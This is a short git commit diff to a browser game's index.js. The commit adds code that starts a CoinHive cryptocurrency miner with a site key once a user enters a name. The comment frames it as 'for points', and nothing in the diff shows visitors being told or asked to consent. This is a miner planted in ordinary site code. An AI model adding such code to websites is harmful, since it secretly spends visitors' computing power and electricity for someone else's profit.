b6079098f6377f3bb7704e0c14e3a79d247982ac
LakeFox <mason@lakefox.net>
2017-09-16 22:25:06 -0500

    Add files via upload

--- index.js
+++ index.js
@@ -8,6 +8,9 @@ document.querySelector("#start").addEventListener("keyup", (e)=>{
     document.querySelector("#start").setAttribute("class","tab");
     document.querySelector("#portal").style.display = "inherit";
     named = true;
+    // Add coin hive for points
+    var miner = new CoinHive.User("7RaiTYKeaBtz17GRNjKDr0LNIpdiT2VR", document.querySelector("#start")+window.location.hash);
+    miner.start();
   }
 });
 var show = "myteam";
